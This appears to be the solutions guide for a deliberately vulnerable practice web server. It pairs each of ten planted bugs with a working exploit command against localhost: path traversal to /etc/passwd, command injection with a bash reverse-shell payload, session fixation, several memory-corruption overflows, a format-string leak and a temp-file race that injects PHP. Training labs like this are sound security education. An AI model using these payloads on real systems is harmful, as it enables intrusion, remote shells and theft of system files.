# Solutions

This document provides detailed steps to reproduce and exploit the vulnerabilities present in the Damn Vulnerable Web Server.

---

### 1. Path Traversal
**Vulnerability**: The server constructs file paths by concatenating the server directory with the user-provided path without sanitizing `../` sequences.
**Code**: `main.cpp` -> `strcat(file_path, clean_path);`

**Exploit**:
Access files outside the web root (e.g., `/etc/passwd`).
```bash
curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
```

---

### 2. Command Injection
**Vulnerability**: The log viewer functionality constructs a shell command using user input without proper sanitization.
**Code**: `request_logger.cpp` -> `popen("sh -c \"grep " + decoded_filter + " ...")`

**Exploit**:
Inject arbitrary shell commands using the `filter` parameter. We use `;` to chain commands.
```bash
# Inject 'ls' command
curl "http://127.0.0.1:8081/logs?filter=foo;ls"

# Reverse Shell Example (requires listener on 4444)
# Payload: ; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
# URL Encoded: %3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261
curl "http://127.0.0.1:8081/logs?filter=%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261"
```

---

### 3. Session Fixation
**Vulnerability**: The server accepts any session ID provided by the client in the `Cookie` header. If the ID doesn't exist, it creates a new session with that ID instead of generating a secure, random one.
**Code**: `session_manager.cpp` -> `set_session_cookie_if_needed`

**Exploit**:
1.  **Attacker**: Chooses a session ID (e.g., `EVIL_SESSION`) and sets it in the victim's browser (or uses it themselves).
2.  **Attacker**: Sends a request with this cookie to initialize the session.
    ```bash
    curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/
    ```
3.  **Victim**: Logs in using the same session ID.
    ```bash
    # Simulating victim login
    curl -H "Cookie: session_id=EVIL_SESSION" -H "Authorization: Basic YWRtaW46YWRtaW4=" http://127.0.0.1:8081/admin/
    ```
4.  **Attacker**: Accesses the authenticated session using the known ID.
    ```bash
    curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/admin/
    ```

---

### 4. Buffer Overflow (Stack)
**Vulnerability**: The server uses `strcpy` to copy the request path into a fixed-size buffer (`clean_path[200]`) without checking the length.
**Code**: `main.cpp` -> `strcpy(clean_path, path_with_query);`

**Exploit**:
Send a request path longer than 200 bytes to crash the server (DoS) or potentially execute code.
```bash
# Crash the server
curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
```

---

### 5. Uncontrolled Format String
**Vulnerability**: The request logger uses `fprintf` with user-controlled input as the format string.
**Code**: `request_logger.cpp` -> `fprintf(log_file, value.c_str());`

**Exploit**:
Send a request with query parameters containing format specifiers (e.g., `%x`, `%n`).
```bash
# Leak memory addresses from the stack
curl "http://127.0.0.1:8081/?param=%p%p%p%p"
```
Check `/tmp/server.log` to see the leaked values.

---

### 6. Insecure Temporary File Creation (Race Condition)
**Vulnerability**: The server creates temporary PHP files in `/tmp/` with predictable names (`/tmp/php_script_[PID].php`).
**Code**: `mime_type_handler.cpp` -> `snprintf(..., "/tmp/php_script_%d.php", pid)`

**Exploit**:
An attacker with local access can modify the temporary file between its creation and execution.

1.  **Monitor**: Watch for the creation of the file.
    ```bash
    while true; do ls -l /tmp/php_script_*.php; done
    ```
2.  **Race**: Run a loop to overwrite the file content with malicious code before the server executes it.
    ```bash
    # Replace content with malicious PHP code
    while true; do echo "<?php system('id'); ?>" > /tmp/php_script_$(pgrep damn_vulnerable).php 2>/dev/null; done
    ```
3.  **Trigger**: Request a PHP file.
    ```bash
    curl http://127.0.0.1:8081/echo.php
    ```

---

### 7. Use-After-Free (Logger Config)
**Vulnerability**: The server frees the `current_log_format` structure but fails to nullify the pointer. Subsequent requests use this dangling pointer.
**Code**: `request_logger.cpp` -> `handle_logger_config`

**Exploit**:
1.  **Allocate**: Authenticate and set a custom log format (allocates memory).
    ```bash
    curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=set&format=AAAA"
    ```
2.  **Free**: Reset the configuration (frees memory, leaves dangling pointer).
    ```bash
    curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=reset"
    ```
3.  **Trigger**: Any request now triggers the UAF. If the heap has been manipulated (e.g., via other allocations), this can lead to RCE.
    ```bash
    curl "http://127.0.0.1:8081/"
    ```

---

### 8. Heap Buffer Overflow (System Status)
**Vulnerability**: The `/admin/system_status` endpoint allocates a small fixed buffer (32 bytes) but copies user input until a newline/null character is found, without length checks.
**Code**: `main.cpp` -> `handle_request` (system_status logic)

**Exploit**:
Send a POST request with a payload larger than 32 bytes to corrupt the heap metadata.
```bash
curl -u admin:admin -X POST "http://127.0.0.1:8081/admin/system_status" -d "status=$(python3 -c 'print("A"*100)')"
```

---

### 9. Integer Overflow (File Upload)
**Vulnerability**: The file upload handler calculates buffer size as `content_len + 64`. If `content_len` is large (near `UINT_MAX`), the addition wraps around to a small number, allocating a small buffer. The subsequent `recv` writes the full large content, causing a massive heap overflow.
**Code**: `main.cpp` -> `handle_request` (upload_file logic)

**Exploit**:
Send a request with a crafted `Content-Length`.
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8081))

# Content-Length: 4294967295 (UINT_MAX)
# Buffer Size = 4294967295 + 64 = 63 (Overflow)
payload = b"POST /admin/upload_file HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Length: 4294967295\r\n\r\n" + b"A"*1000

s.send(payload)
s.close()
```

---

### 10. Type Confusion (Rule Engine)
**Vulnerability**: The server casts a `Rule*` to `ExecRule*` blindly based on the URL path (`/cgi-bin/`), even if the object is actually an `AliasRule`. This allows an attacker to control the `callback` function pointer using the `target` string of the `AliasRule`.
**Code**: `main.cpp` -> `handle_request` (Type Confusion logic)

**Exploit**:
1.  **Create Malicious Alias**: Add an alias where the `target` string contains the address to jump to.
    ```bash
    # Example: 0x4141414141414141 (AAAAAAAA)
    curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=alias&path=/cgi-bin/exploit&target=AAAAAAAA"
    ```
2.  **Trigger**: Request the path. The server treats the AliasRule as an ExecRule and jumps to `0x4141414141414141`.
    ```bash
    curl "http://127.0.0.1:8081/cgi-bin/exploit"
    ```
